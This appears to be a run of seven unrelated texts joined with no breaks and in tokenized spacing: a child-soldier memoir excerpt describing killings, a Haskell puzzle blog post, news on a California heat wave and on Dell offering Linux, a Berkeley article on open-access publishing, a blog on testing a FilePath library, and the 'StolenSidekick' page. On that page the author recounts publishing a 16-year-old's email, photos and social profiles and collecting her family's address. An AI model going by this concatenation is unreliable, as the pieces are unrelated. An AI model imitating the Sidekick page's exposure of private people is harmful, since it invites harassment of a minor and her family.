We watched war movies at night , Rambo “ First Blood , ” “ Rambo , First Blood , Part II , ” “ Commando ” and so on , with the aid of a generator or a car battery .
We all wanted to be like Rambo ; we could n’t wait to implement his techniques .
When we ran out of supplies , we raided rebel camps in towns , villages and forests .
“ We have good news from our informants ” the lieutenant would announce .
“ We are moving out in five minutes to kill some rebels and take their supplies , which really belong to us . ”
He often made speeches about how we were defending our country , how honorable we were .
At these times , I would stand holding my gun and feeling special because I was part of something that took me seriously and I was not running from anyone anymore .
The lieutenant ’s face evinced confidence ; his smiles disappeared before they were completed .
We would tie our heads with the green cloths that distinguished us from the rebels , and we boys would lead the way .
There were no maps and no questions asked .
We were simply told to follow the path until we received instructions on what to do next .
We walked for long hours and stopped only to eat sardines and corned beef with gari , sniff brown brown and take more white capsules .
The combination of these drugs made us fierce .
The idea of death did n’t cross my mind , and killing had become as easy as drinking water .
After that first killing , my mind had stopped making remorseful records , or so it seemed .
Before we got to a rebel camp , we would deviate from the path and walk in the forest .
Once the camp was in sight , we would surround it and wait for the lieutenant ’s command .
The rebels roamed about ; some sat against walls , dozing off , and others , boys as young as we , stood at guard posts passing around marijuana .
Whenever I looked at rebels during raids , my entire body shook with fury ; they were the people who had shot my friends and family .
So when the lieutenant gave orders , I shot as many as I could , but I did n’t feel better .
After every gunfight , we would enter the rebel camp , killing those we had wounded .
We would then search the houses and gather gallons of gasoline , enormous amounts of marijuana and cocaine , bales of clothes , watches , rice , salt , gari and many other things .
We rounded up any civilians — men , women , boys and young girls — hiding in the huts and houses and made them carry our loot back to the base .
We shot them if they tried to run away .
On one of these raids , we captured a few rebels after a long gunfight and a lot of civilian casualties .
We undressed the prisoners and tied their arms behind their backs until their chests were tight as drums .
“ Where did you get all this ammunition from ? ” the corporal asked one of the prisoners , a man with an almost dreadlocked beard .
He spat in the corporal ’s face , and the corporal immediately shot him in the head at close range .
He fell to the ground , and blood slowly leaked out of his head .
We cheered in admiration of the corporal ’s action and saluted him as he walked by .
Suddenly , a rebel hiding in the bushes shot one of our boys .
We dispersed around the village in search of the shooter .
When the young muscular rebel was captured , the lieutenant slit his neck with his bayonet .
The rebel ran before he fell to the ground and stopped moving .
We cheered again , raising our guns in the air , shouting and whistling .
During that time , a lot of things were done with no reason or explanation .
Sometimes we were asked to leave for war in the middle of a movie .
We would come back hours later after killing many people and continue the movie as if we had just returned from intermission .
We were always either on the front lines , watching a war movie or doing drugs .
There was no time to be alone or to think .
When we conversed with one another , we talked only about the movies and how impressed we were with the way either the lieutenant , the corporal or one of us had killed someone .
It was as if nothing else existed .
An interesting programming puzzle appeard in the Blogosphere :
To describe every integer from 1 to 100 as a calculation involving only and exactly four fours , and standard operations .
There are solutions in C# ( code ) and in python ( code ) , so I tried to do mine in Haskell .
This seems to be meant for Haskell .
The Type system makes the program really great to read .
Functional programming allows me to conveniently create all possible associations of four operands with three binary operations .
( I found five .
Why are the other two sources using four ? )
And , in this program particular , the use of the list monad to quickly generate a list of all possible combination is really a programming - time - saver .
The program is not too slow either ( IBM Thinkpad T41 p with Intel M 1700MHz ) :
$ time ./ fourfours >/dev/null
real 0m0.917s
user 0m0.852s
sys 0m0.040s
And it could probably be sped up by using some kind of hashing or similar stuffs .
Note that the program has only 73 mostly quite short lines , while the python code has 119 and the C# code has 138 of relatively long lines ( comments and empty lines not counted ) .
I think this is impressive ( unless you have worked with haskell a bit , then you are used to these kind of results ) .
Comments welcome !
Californians did an impressive job conserving energy Sunday , but power regulators are forecasting record energy demands as everyone heads back to work today , making conservation absolutely critical .
" While we got through today just fine , we 're very concerned about Monday .
Everybody goes back to work and cranks on the computer , the coffee machine , the fax machine , " said Gregg Fishman , a spokesman for the California Independent System Operator , a nonprofit corporation that manages the state 's power grid .
" A lot of the office buildings that closed over the weekend have heated up , so the air conditioning load on a hot Monday is often incredible , " Fishman said .
The state likely will hit a Stage 2 power emergency today and could face rolling blackouts , a Stage 3 emergency , in the afternoon , when usage levels typically peak , Fishman said .
An estimated 436,000 customers in the greater Bay Area lost power at some point Saturday or Sunday in heat - related power failures , PG&E spokesman David Eisenhower said .
By 8 p.m. Sunday , service had been restored to 73 percent of those customers , leaving about 124,000 without power .
Eisenhower said Bay Area crews were responding to 2,400 separate blackouts , most in the South Bay and inland East Bay .
Conditions are expected to be ideal -- heat , humidity and little to no wind -- for creating smog .
So the Bay Area Air Quality Management District has declared the season 's ninth Spare the Air day , when commuters are urged to carpool or take mass transit .
Buses , trains and ferries will not be free today , however , as they were on the six Spare the Air days that fell during the workweek , because funds have run out .
Even as temperatures dropped slightly Sunday , records were broken across the Bay Area .
The high of 104 Sunday in San Jose beat the record for the date of 97 set in 2005 .
San Rafael 's 106 surpassed that city 's record 99 , also set last year , while the Associated Press reported the temperature reached 113 in Livermore .
And San Francisco reached 83 , barely topping the 2005 record of 82 .
Oakland 's high of 89 fell short of its 2005 record of 92 .
Meteorologists blamed a stubborn high - pressure system that heats air and destroys clouds .
" It 's been fairly stationary over the last several days , and it 's been able to get to an atypical strength , " said Brooke Bingaman , a National Weather Service meteorologist .
" That 's Mother Nature .
She keeps us guessing and throws us curve balls every once in a while . "
At the New York Frankfurter hotdog stand at Powell and Market streets in San Francisco , business was steady but different Sunday .
Joe McKeon , who has been in the hotdog business for 12 years , said he was selling a lot more drinks and ice cream than dogs .
Tourists ' questions were a little different , too .
" Usually around this time of year , I get freezing tourists coming straight from SFO wondering where they can buy a long - sleeve sweatshirt , " McKeon said .
" I did n't get that question today . "
Around the corner from McKeon 's umbrella - shaded stand , San Francisco street - cleaner Israel J. Taylor said he spent the afternoon picking up a lot more trash than he does on cooler days .
" It seems like when the temperatures elevate , so do people 's attitudes , " said Taylor .
" Today I 've seen a lot of people throw their garbage right on the ground even if a trash can is right in front of them .
I guess when it 's this hot , walking 2 feet is a long way for some people . "
The first six months of 2006 have been the hottest on record for the United States as a whole , according to the National Climatic Data Center , which has collected data since 1895 .
" Whether or not that 's global warming , everyone has an opinion , " Bingaman said .
" You can find statistics for it and against it . "
Bingaman forecast the high - pressure system to weaken and move out by next weekend , when temperatures should return to normal .
Consumers have already cut energy use significantly .
Demand for electricity was down by 200 megawatts from Saturday -- the equivalent of eliminating 140,000 homes , according to PG&E .
But that was n't enough .
The power company is urging people to set thermostats to at least 78 degrees today and cut back on using dishwashers and other large appliances .
A Stockton nursing home patient died Sunday when the air conditioning failed at the Beverly Healthcare Center , a spokeswoman said .
Staff at the center transferred 103 patients to nearby nursing homes at 4:30 a.m. , about an hour after the cooling system shut down , said spokeswoman Amy Knapp .
The patient died after being taken to a local hospital .
In Sunnyvale , the heat and a power outage at a mobile home park prompted city officials and the Red Cross to open a relief center at Columbia Middle School .
Residents of the mobile home park , which has about 1,000 homes , could spend several hours and possibly the night in the school 's air - conditioned gym .
The Associated Press reported four other deaths across the state this week may have been caused by the heat , and 50,000 Southern California homes were without power Sunday evening .
Though today will be this year 's ninth Spare the Air day , including Saturday and Sunday , only one was declared last year , said Luna Salaver , a spokeswoman for the Bay Area Air Quality Management District .
" The budget for six free fare days has been exhausted , " Salaver said .
" We were totally caught off guard to use up all these days before the season ended .
To run out so quickly was an experience no one predicted . "
The Metropolitan Transportation Commission , a regional agency , originally set aside $ 7.5 million for three days of free rides .
After hot , windless weather in June exhausted that money , the commission came up with $ 5.3 million to fund three more days of rides .
Salaver suggested biking , carpooling and taking public transit -- even if it 's not free .

Berkeleyan Free- science movement gains a foothold at Berkeley
Mega - publishers still control most research , but authors , librarians , and politicians are calling for change
When the journal Nature reported last month that a group of scientific - publishing goliaths had enlisted a " PR pit bull " to " take on the free - information movement " - a story that quickly entered the mainstream media through the Washington Post , then replicated itself endlessly via the blogosphere - the move was widely viewed as a declaration of war .
The long knives , it appeared , were finally out .
In response , the slingshots , too , came out in force .
( Schekman photo by Bonnie Azab Powell ; Eisen photo courtesy PLoS )
" The twisted logic required to come up with the phrase ' Public access equals government censorship ' leaves me in uncomfortable awe , " read a typical posting , referring to the most inflammatory of the spins suggested by Eric Dezenhall - whose corporate and celebrity clients have included ExxonMobil and Enron 's Jeffrey Skilling - at a previously undisclosed meeting arranged by the Association of American Publishers , an industry trade group .
" I can't imagine any of the academics I know willingly supporting / falling for this slickster , big - business , fear - mongering approach to where and how to publish , " fumed another blogger .
Similar cries of outrage came from an assortment of academics , librarians , and others who believe , in Stewart Brand 's famous formulation , that " information wants to be free . "
At Berkeley , though , one scientist at the heart of the so - called open - access movement - which aims to apply that principle to the highly specialized realm of scientific and medical research - was thrilled to hear that big commercial publishers were circling the wagons to defend their for - profit , subscription - based model .
" I think it 's fantastic , " exults Michael Eisen , an assistant professor of molecular and cell biology and a genetics researcher at Lawrence Berkeley National Laboratory .
" It 's just evidence that open access is working . "
Eisen , who received a Presidential Early Career Award for Scientists and Engineers at a White House ceremony in 2004 , is a co-founder of the San Francisco - based Public Library of Science , a leading advocate for free , online dissemination of scientific research .
With Harold Varmus , a Nobel laureate and former director of the National Institutes of Health , and Patrick Brown , a biochemistry professor at the Stanford University School of Medicine and an investigator with the Howard Hughes Medical Institute , Eisen started the nonprofit PLoS ( pronounced Ploss ) in 2000 , intending to change the way research is disseminated - or not - to the wider world .
PLoS 's first act was to circulate an open letter to scientists , asking that they pledge to " publish in , edit or review for , and personally subscribe to " only scholarly and scientific journals that provide free , unrestricted rights to their contents within six months of publication .
When that effort failed to alter the landscape - despite garnering nearly 34,000 signatures from scientists in 186 countries - the three decided to start publishing their own peer - reviewed journals , beginning with PLoS Biology in the fall of 2003 and , a year later , PLoS Medicine .
For Eisen and others at the forefront of the movement , the issue is less whether information wants to be free than that society needs it to be .
Underlying the push for open access , Eisen says , is the idea that " the interests of virtually everybody involved in the creation and dissemination of scientific knowledge are best served by a system in which the end products of scientific research - the papers that scientists write and publish - are effectively in the public domain . "
With subscriptions for many scientific journals running to thousands of dollars - and some single - article downloads priced at more than $ 50 apiece - proponents of open access argue that vital medical knowledge , for example , is prohibitively expensive for individuals and families seeking reliable information , as well as for health workers caring for patients in developing countries .
And as rising subscription fees force many libraries to constantly scale back their collections , even university - affiliated researchers can find themselves in the dark .
" When you do an experiment , or think about the results of an experiment , you now need to be considering the accumulated knowledge of hundreds or thousands of genes , " explains Eisen , a computational biologist .
" You simply can't know everything that 's been published that 's relevant to an experiment you 're doing . "
Many scientists , he adds , need not only access to printed text , but the ability to more fully exploit computer technology by manipulating and massaging other researchers ' data - as was done , in one prominent example , with the Human Genome Project .
" It 's completely ridiculous that I , a publicly funded scientist , am unable to get access to the articles written by my colleagues and to download them onto my computer , " says Eisen .
" I 'm not trying to steal their ideas , I 'm not trying to do anything but make that information - which they 've spent their lives generating , and the government has spilled billions of dollars into funding - much more robust , much more dynamic , and much more useful .
And publishers - because they view the scientific literature as their own private property , and are trying to protect their ability to profit from that literature - are completely inhibiting my ability to use it in this way . "
Open -access pros and cons
The so - called STM ( science , technical , and medical ) publishing business , an estimated $ 10 billion industry , is increasingly dominated by a handful of companies like Elsevier ( with some 1,800 journal titles ) and Wiley ( at 350 and counting ) , both of which were represented - along with the American Chemical Society - at the AAP - sponsored meeting with Dezenhall .
According to the Nature report , Dezenhall urged them to focus on " simple messages , " such as " Public access equals government censorship " - an apparent reference to demands that articles be posted to PubMed Central , a science - information repository created by the NIH - and to " paint a picture of what the world would look like without peer - reviewed articles , " a prospect apt to horrify no one so much as editors at the many peer - reviewed open - access journals .
" We 're like any firm under siege , " an AAP vice president told Nature in explaining the turn to hardball tactics .
" It 's common to hire a PR firm when you 're under siege . "
In a recent posting on its own website , Elsevier - whose journals generate upwards of $ 1.5 billion in annual revenues - warned that the open- access model , " which transfers the cost of publishing from reader to author , could jeopardize the stable , scaleable , and affordable publishing that currently exists . "
For Berkeley 's library , ' serials crisis ' means shrinking access to information
When the 10 UC libraries joined the Public Library of Science as an institutional member in 2004 , Beverlee French , systemwide director for shared digital collections , called the move an effort at " directing some of our scarce dollars away from overpriced journals and toward innovation . "
With budgets flat and scholarly - journal prices rising far faster than inflation , however , what 's known as the " serials crisis " remains a pressing problem here at Berkeley and at universities and research institutions throughout the nation .
Chuck Eckman , associate University Librarian and director of collections at Berkeley , warns that without increases to its budget , the campus library faces a shortfall of roughly $ 1.4 million in 2008 - with a commensurate reduction in journal , book , and digital - resource acquisitions - and a still - larger deficit in 2009 .
" There 's normal inflation and excessive inflation , " Eckman says , referring to skyrocketing prices for serial journals .
According to the Association for Research Libraries , serials costs jumped 226 percent between 1986 and 2000 , a period when the Consumer Price Index rose by 57 percent .
Beth Weil , head of the Marian Koshland Bioscience and Natural Resources Library , says that the UC system 's negotiating power has helped to tamp down prices for scientific journals - UC is among Elsevier 's biggest customers , for example - and the campus has switched to somewhat cheaper online - only versions of many serials , though not for such popular titles as Science and Nature .
But Weil , who serves on the PLoS board of directors , believes the solution to the bind facing university libraries - and the scholars and students who rely on them for access to scientific research - lies with researchers themselves .
" The only way out of this serials crisis that we 're currently in is to change where faculty publish , and to make sure that faculty are aware of the crisis in scholarly communication , " she contends .
" A lot of people view this as a library problem - you know , I frequently hear , ' Beth , what are you going to do about this ? '
Well , there 's really a limit to what I can do about it , because it 's really in the hands of the people who make decisions about where they publish and how much control they want to have over their work once it 's been published . "
Eckman hopes that an increase in the scope and volume of " open " resources , including open - access journals and free , repository - based content , will help to restore some balance - a hope echoed by Weil , who fears prices are headed back up .
" When the state of California was in very bad straits , " she says , commercial journal publishers were more willing to hold subscription - cost hikes to " reasonable " levels .
" But now , nobody 's keeping their price increases particularly reasonable , " she adds .
" So we 're running out of rabbits to pull out of the hat . " - BB
Eisen and other open - access advocates dispute such logic , maintaining that whatever threat they pose is to the industry 's profits , and not to authors and readers of scientific literature - who , they point out , are often the same people .
Under what 's known as the " author pays " model , PLoS charges contributors $ 2,500 to publish in PLoS Biology and PLoS Medicine , with somewhat lower fees for a number of other journals now in its catalogue .
Despite the name , most such fees are paid not by the author , but by the agency funding the research .
PLoS authors retain the copyright to their work under a Creative Commons license , which permits unrestricted access , copying , and distribution so long as the original author and source are credited .
Commercial publishers , by contrast , hold the copyrights to contributors ' work , allowing them to strictly control access and distribution of their journals ' contents .
" The way publishers cover their costs and make a profit is by selling the contents of their journals back to the researchers , " Eisen says .
" The core economics of that is that universities or research institutions pay subscription fees to get access to the research that they 've provided for free to the journals in the first place . "
Industry economics are putting a heavy burden on universities as well , at least partly due to a move toward consolidation over the past 15 years that 's left 37 scholarly publishers , Nature included , in the hands of six corporate entities .
" The cost of serials goes up every year , " says Beth Weil , head of the campus 's Marian Koshland Bioscience and Natural Resources Library , " and the library 's budget has not increased since 2001 .
That is the problem , simply stated . "
( See sidebar at right . )
And because so much of the money for scientific publishing derives from the federal Treasury - in the form of direct research grants to scientists and indirect funding to publishers for printing their work - the result , Eisen says , " is a business that for decades has basically been allowed to print checks from the government to themselves with very little restraint . "
To suppress or not suppress ?
By coincidence , on the morning the Nature story broke , digital - publishing consultant Joseph Esposito was on campus at the invitation of the Center for Studies in Higher Education to discuss what he terms " the three - legged stool " of academic publishing - open - access , not - for - profit , and commercial publishers .
Esposito , a former executive at Simon and Schuster , Random House , and Encyclopedia Britannica , said that while all three business models have their uses in academia , open access has thus far " failed to deliver a compelling economic model . "
He laid out what might be the fundamental divide between the commercial publishers ' " fee for access " model and the " fee for services " model proffered by open - access proponents .
" The joke among publishers is , There are 6.2 billion people on the planet , and 12.4 billion authors , " he said .
" The point of publishing is not to encourage production .
The point of publishing is to suppress production . "
" Some people say , ' Wait a second , I do n't like that , ' " Esposito added .
" But that 's what publishing is . "
For open - access advocates , at least , that 's precisely the problem .
" When we 're trying to make a judgment as a research community and as a society about what 's the best way to disseminate scientific information , the question is , What is the system that best serves the goals of science ? "
Eisen says .
" And the goals of science are to produce knowledge about human health and about the world and to make sure that knowledge is used in ways that both maximally advance research and maximally benefit the public . "
Gavin Yamey , a physician and senior editor at PLoS Medicine , explains the difference this way : " A publisher is a service provider , " he says .
" We 're like a midwife .
We help deliver the baby .
We do not keep the baby . "
Scientific - publishing economics
Yet even for some who sympathize with the goals of the open- access movement , the economics do n't necessarily add up .
Randy Schekman , a Berkeley professor of molecular and cell biology and the editor of Proceedings of the National Academy of Sciences , or PNAS , is among them .
" When [ PLoS co-founder ]
Pat Brown first issued his manifesto some years ago calling on everyone to sign a petition to demand that all the scientific literature be made available immediately to files that would be controlled somewhere in Washington , I did not sign it , " he recalls .
" Because having been an editor for the Journal of Cell Biology for many years , I realized that this would be the death of many of the journals - even those run by some of the scientific societies , or by places like Rockefeller Press , " his former journal 's parent organization .
" I 'm sympathetic to the notion that the literature should be generally available , " adds Schekman .
" But I 'm not sympathetic to the notion that it should be available instantly . "
Unlike many society journals , PNAS is mandated by its parent , the National Academy of Sciences , to break even , and its revenues do not help support the society .
In order to keep operating , Schekman says , subscription fees are crucial .
To provide an incentive to subscribers , PNAS has a six - month embargo on articles it publishes , after which time they become freely available online .
The author - pays model , he believes , is workable for PLoS only as long as it continues to receive major grants from such funders as the Betty and Gordon Moore Foundation , which helped launch the organization with a $ 9 million gift .
" You have to have a better business plan than they 've had at PLoS , " he says , in order to prove the viability of open access as an alternative to existing publishing models .
Even so , PNAS has taken steps in the direction of more - open access , including two instituted by Schekman 's predecessor as editor , the late Berkeley professor Nicholas Cozzarelli , who served as a PLoS director .
For a fee , authors can opt to have their papers made available upon publication .
The journal 's contents are also immediately accessible at no cost in developing countries .
As for the reluctance of many scientists to publish their work in an open - access journal - an issue identified by proponents as slowing the movement down - Schekman believes it 's more a question of bona fides than business models .
" PLoS could do well and then people would clamor to publish there , " he says .
" I 'm not sure it relates to whether a journal is publicly available or not : I think it has to do with the prestige of the journal . .
I do n't think it's that Cell , Nature , and Science are proprietary and not publicly available that gives them that charm .
It 's just that they 've done a very good job in building up a very selective journal . "
That , in fact , is precisely what Eisen is hoping to do .
And he thinks it 's a matter of time before researchers come around .
" People believe their careers can be made by a publication in Science or Nature , the elite journals in the field , " he says .
" So the challenge for open access has been to provide scientists with a system that changes the economics of scientific publishing while still providing them with the other things they get from scientific journals . "
The movement could get a boost from legislation expected to be reintroduced shortly by Sens.
John Cornyn ( R - Texas ) and Joseph Lieberman ( I - Conn . ) , the Federal Research Public Access Act , or FRPAA , which would require federal agencies that fund more than $ 100 million in research annually to make articles resulting from that research available on the Internet .
Feb. 15 has been declared a " national day of action " on many college campuses in support of the bill .
Meanwhile , the mindset that rules the publishing world , say some observers , is best captured by an article on the availability of medical research in one of the poorest regions of the globe , titled " Impediments to Promoting Access to Global Knowledge in Sub-Saharan Africa . "
Should you happen to be practicing medicine in Kenya , say , without a subscription to Library Management , online access to the article - as PLoS Medicine 's Yamey delights in pointing out - will cost you $ 25 .

monospace
I just released System .
FilePath , a library for manipulating FilePath 's on both Windows and Posix .
The problem with a library like this is that there are lots of corner cases , lots of weird situations and everything needs to be tested twice with different semantics .
Obviously this requires a test infrastructure different from most other libraries !
I started off with a separate file for writing properties , but quickly found that the properties were the best type of documentation for a function .
It was also a pain to keep two different places which identify what the logic of the code is - i.e. the code and the tests .
The obvious idea then is to combine the code , documentation and testing into one .
Because I am using Haddock that turned out to be quite easy to do - any line beginning with " -- > " is a test .
Haddock sees this asformatting , Haskell as comment , and my test generator can find the tests pretty easily .
Within the System .
FilePath repo I have a DOS Batch file driver ( test .
bat ) which uses a separate Haskell program ( GenTests.hs ) to create a test script and run it .
Within the test listing there are some tests which I refer to as constant , and some as properties .
Some of the tests have no free variables , these are constant - the GenTests recognises them and outputs them directly - in one execution they either pass or fail .
The properties are just standard QuickCheck properties , with the restriction that every multi-letter keyword not in a certain known set is a function in the library , and every variable x..z is a FilePath ( hence using a custom FilePath generator ) .
The main complication in testing from System .
FilePath is the fact that every property corresponds to two different tests - one on the Posix implementation , one on the Windows implementation .
The translator automatically does this duplication , unless either Posix : or Windows : is given at the start of the test , in which case the test is only executed on the appropriate version .
For QuickCheck testing I defined a FilePath to be a 25 character string , from the following set of characters " ?|./:\\abcd 123 ;_ " .
The idea of this set of characters is to include every character that any aspect of the library treats differently , along with a small selection of " normal " letters / numbers .
There was one modification I had to make to QuickCheck , by default QuickCheck returns successfully outputting success / failure to the console .
Unfortunately if an automatic program is executing over 200 tests , then these messages can get obscured in the general noise - this happened more than once .
To combat this I defined a new QuickCheck wrapper which calls error on failure .
Ideally the signature of quickCheck should be changed to :: .. ->
IO
Bool to detect these situations and allow the driver script to fail more obviously .
Without QuickCheck
I do n't think it would have been possible to write the FilePath library - it caught too many obscure bugs that manual testing would never have found .
In addition , QuickCheck forced me to think about the properties of the library more closely - I changed some design decisions after it turned out that the properties disagreed with me .
The one thing QuickCheck helped with more than anything though was refactoring - despite a massive number of the functions all depending on each other , QuickCheck allows me to change the behaviour of one function in some obscure case and check that no other function was relying on that .
The only criticism that can be levelled at my use of QuickCheck is that failing examples are not minimal , in fact they are exactly 25 characters long .
I hope that at some point soon I can make use of SmallCheck ( once it has a darcs repo and a .cabal file ) to do testing alongside QuickCheck to get a greater depth of coverage .
All the test scripts I have written are available in the darcs repo , under the BSD3 .
If anyone can make use of them , I 'd be happy to have someone take them forward !

Dell users may soon have the choice of having Linux pre-installed on their machines , according to a statement on the technology company 's website .
The PC maker launched its feedback website , Dell Idea Storm , in mid-February , and was inundated with requests for the Linux operating system and productivity software suite OpenOffice to be included on all Dell computers .
Users are requesting the top three free Linux versions for free pre-installation .
" Quality free and open source software drastically lowers the cost of new PCs , and helps prevent software piracy , " the suggestion on the Idea Storm website said .
" For example , OpenOffice.org , the Microsoft Office alternative , can shave hundreds of dollars off the price of a new PC . "
Dell currently offers some Linux options , but the open source system was not available across the full Dell range .
The company 's nSeries machines are available without an operating system , but only to US customers .
Windows systems and software are currently the standard option for Dell machines .
" It 's exciting to see the Idea Storm community 's interest in open source solutions like Linux and OpenOffice .
Your feedback has been all about flexibility and we have seen a consistent request to provide platforms that allow people to install their operating system of choice , " the company said in its statement .
" We are listening , and as a result , we are working with Novell to certify our corporate client products for Linux , including our OptiPlex desktops , Latitude notebooks and Dell Precision workstations .
This is another step towards ensuring that our customers have a good experience with Linux on our systems . "
Dell is one of the top PC makers in the world , currently second in the world laptop leagues behind HP .
According to figures released in January , the company had 17.5 per cent of the market in the third quarter of 2006 , showing growth of 16 per cent quarter - on - quarter .
However , the company has been hit by a number of setbacks in recent months , including the now infamous battery recall , and legal action in Canada over allegations that its notebooks suffer from design faults that could lead to premature failure of the motherboard due to overheating .

Welcome to the StolenSidekick Page :
This original updates page has been replaced with this abridged version .
If you want to see the original , the link is located below .
Be forewarned , I have been told it sometimes takes up to 3 hours to read the entire thing ( since most of my views come from people at work , I am afraid to think of all the hours corporations have lost because of this site ) .
The back story :
On May 31st , my friend Ivanna left her T - Mobile Sidekick II in a taxi cab in New York City .
This caused her great distress as she was getting married in 2 - 3 weeks from that day .
Along with all her friends and families ’ contact info , she also had all the caterers , band , wedding planner , etc info on there too .
Even more important , was the fact that she had been in contact via email on the Sidekick with the US Embassy in Russia securing a visa for her sister , her maid of honor , to come to the wedding .
She had n’t seen her sister in many years and getting her here was one of the most important parts of planning this wedding .
As soon as she realized that she had left it in the taxi , she contacted me and asked me to try and contact who ever found the phone .
She could n’t do it herself as she was getting her dress fitted that day .
I proceeded to call the phone .
I also sent text messages and emails to the Sidekick with the subject and body “ --==REWARD IF FOUND== --“ .
After 1 - 2 days of constant attempts of contacting the person(s ) who found the phone , we gave up and decided to buy a new one .
Unfortunately , New York City was sold out of Sidekick IIs as T - Mobile was coming out with the III in the end of June / beginning of July .
After visiting and calling many stores , we were finally able to purchase one June 2nd .
As it was already night , we did n’t activate the new SIM with her account until the 3rd .
When she activated her new Sidekick , Ivanna realized that the person who found the phone had been using it .
Not only had the person emailed Ivanna ’s private pictures to herself and friends , but she had also taken pics of herself , family and friends , used the phone , sent emails of the pics she had taken , and signed on to AOL .
We could see all this because the Sidekick works differently than most phones .
While on a average phone any activity and content stays on the actual phone , on the Sidekick EVERYTHING gets automatically uploaded to T - Mobile servers which is accessible on the internet .
That means any pictures you take , and emails you send / receive , any notes you take , etc can be access from the internet .
When you replace the phone , T - Mobile downloads all the content to the new Sidekick from the old Sidekick .
We had n’t seen the content that the person had put on the found phone as Ivanna had not ever signed up for the T - Mobile web access .
Once the phone was lost , it was too late to register as T - Mobile sends your sign in info to the phone , creating a catch 22 if you do n’t have the phone on you .
One thing we immediately noticed was that the person who had found the phone had deleted all the reward text messages and emails .
On top of that , the person had started using the Sidekick sending herself emails 2 - 3 hours after my friend had left it in the taxi .
So , all in all , we could determine that this person had purposely ignored the requests of the rightful owner .
Ivanna gave me the person ’s AOL screen name and I waited for them to sign on .
Since the email address and the AOL name matched , I knew that her name was Sasha .
When she signed on , I sent her an instant message informing her that she had our phone and requested it back .
I was rebuffed with cursing , racist comments , and illiterate sentences .
She claimed that her friend found the phone and that she was keeping it .
I asked if it was the overweight person in the pictures we had obtained from the phone .
He then got on the IM and started again with the racist comments as well as violence .
He told me to come to an address in Corona Queens because he “ got ball ” and he ’d give me the Sidekick so he could hit me “ wit it ” .
I informed them that I had all their pics , their email / screen name and would post this online .
They informed me that they had the “ white little biyotch ” info who owned the phone and would post that online too .
I informed my friend of this conversation and was upset as me about this .
We could n’t understand how someone would not return something that does n’t belong to them .
I have lived in New York City most of my life , and have found cell phones , wallets , etc in the back of taxis as well as other places .
I have returned every single item to their right full owner .
In return , I have gotten back many items I have misplaced .
It is what is morally right .
I believe in “ what goes around , comes around ” .
In that respect , I try to be as courteous to everyone as I wish them to be to me .
To have someone confronted with your property and blatantly refuse to give it back , was not only morally reprehensible but also a crime .
When someone finds your lost item , they have a certain time period to attempt to find the owner .
After that period lapses , then they are permitted to keep the found item .
If the owner contacts you , then you are obligated by law to return that item .
If you do n’t , it is considered petit larceny ( yes that is how it is legally spelled ) .
I decided to do something about this and follow up with what I had warned them I would do and post their info online .
The online story :
On June 6th , I posted the story of what happened as well as Sasha ’s email address and the pics she had taken of her mother , the overweight friend , and herself .
I decided not to post the picture of a baby and her little brother .
All this info went on a page in the subdirectory of my personal website .
My website previously had only been visited by my friends never receiving more than 1,000 hits a month .
I then posted the link to the “ Stolen Sidekick Page ” on a forum I was a member of , as well as IM ’d it to a couple of friends .
After a couple hours I started receiving a large amount of email to a new address I had created just for this story .
One of them had Sasha ’s Myspace account address .
I then posted the page on Digg.com .
Soon , it went to the front page of Digg , becoming the highest “ dugg ” story for the week .
By the time I went to sleep that night , the page had received almost 50,000 unique visits .
By June 7th , it had gotten 500,000 .
I received more and more emails from visitors including an NYPD officer who told me I should go to the police to have them handle this matter .
I then received an email from Sasha ’s brother who informed me that his sister had bought the phone from a taxi driver , that she would not return this phone , and that he was military police and I would have to deal with him if I did n’t take down the page .
When I posted this info , I received emails from people in the military as well as veterans who were shocked at this kind of behavior from a fellow serviceman .
People discovered his name , Luis , and his Myspace page as well as the overweight fellow ’s name , Gordo , and his Myspace page as well .
By the next day , I was getting millions of visitors .
There were hundreds of thousands of website pointing to mine according to Google .
I was also getting 3,000 emails a day .
This kind of response was amazing .
People who lived in Corona had found the real address of Sasha .
Either from extreme research or from actually knowing them .
I was even sent a pic of the brother in uniform ( which I was told was against protocol for him to wear ) .
So from the information emailed to me , I was able to determine their real address , that Sasha was a 16 year old girl with a baby , Gordo was 25 and lived with her family , and her brother was about 25 and had just graduated from his military class ( I was informed of this by a member in his graduating class ) .
I requested people to not visit her house or contact her in person in any way .
Since posting their online info , they had received thousands of emails demanding that they return what was not theirs .
Their Myspace accounts had been barraged with comments as well .
I also informed people on the page that the fact that they were Puerto Rican and I was white had no factor in the story .
It was about what was right , regardless of race , religion , etc .
Also in the emails was multiple request from news outlets such as radio , newspaper , and TV .
Most of the interviews were on the phone , with some news outlets ( such as the New York Times ) saying that they would need to confirm the story before printing .
I looked forward to this as I had started receiving emails from viewers who felt that this page was either a false story or that I was a viral ad for T - Mobile .
By June 9th , I was receiving millions upon millions of hits .
The brother had emailed me again repeating his story that his sister had bought the phone from a taxi driver and would not return it because then she would be out the money .
I returned the email saying that this story made no sense as she had already said she got the phone from her friend , as well as the fact that we had offered her a reward and would have happily replaced any money she had spent .
Besides this , the legal tenet of “ Caveat Emptor ” comes into play .
It translates into “ Let the buyer beware ” .
Basically this means that no matter how you buy an item , you are legally responsible for the authenticity for the purchase .
Sasha had also responded to the attention by stating on her Myspace page that she did n’t have the phone .
I decided to bring up a forum so I could try and answer questions in a larger scale , rather than just answer 1 by 1 as I was in the emails .
I had received multiple offers of forums to use , so I picked one with good resources .
As soon as I put up the link , I checked the stats of the forum .
After 30 seconds we had over 100 visitors .
By 1 minute , we had 300 visitors and 10 members .
By 5 minutes , we had 10 posts , over 100 members , and over a 1,000 visitors .
After that , the server crashed from the usage .
By this time I was on the front page of 400,000 websites , had been “ Slashdotted ” , and was at almost 4,000 emails a day .
I had emails from all over the world .
Even a band had written a song about the incident .
I tried to put up another board on Google Groups , and after an hour , had Google put a restriction on posts due to over usage .
After multiple disastrous attempts at putting up a forum ( including bringing down an ISP from traffic ) , we were at last successful .
I started noticing as much as there were positive feedback on what I was doing , there was also a lot of negative comments from nay sayers declaring that the site was false .
Also , that I was either doing the wrong thing , had the wrong girl , or remarked about her age .
I responded decaring the authenticity of the page , that I had enough facts to know I had the right girl , and that regardless of her age , she should know better than to keep someone else ’s property , as well as the adults around her helping her keep the ill gotten Sidekick .
I had put up a paragraph on the website pleading wirh her and her family to do the right thing and return the Sidekick .
I promised to take down the website if it was returned .
I never received a response to this ,
We finally went to the police station and asked to submit a stolen property report .
Without our knowledge , the officer only filled out a lost item report .
The difference is that no actions would be done with this report .
A lost item report is mostly for insurance claims ( which we did n’t have ) .
After numerous failed attempts to contact the police station , I was finally able to get the report number .
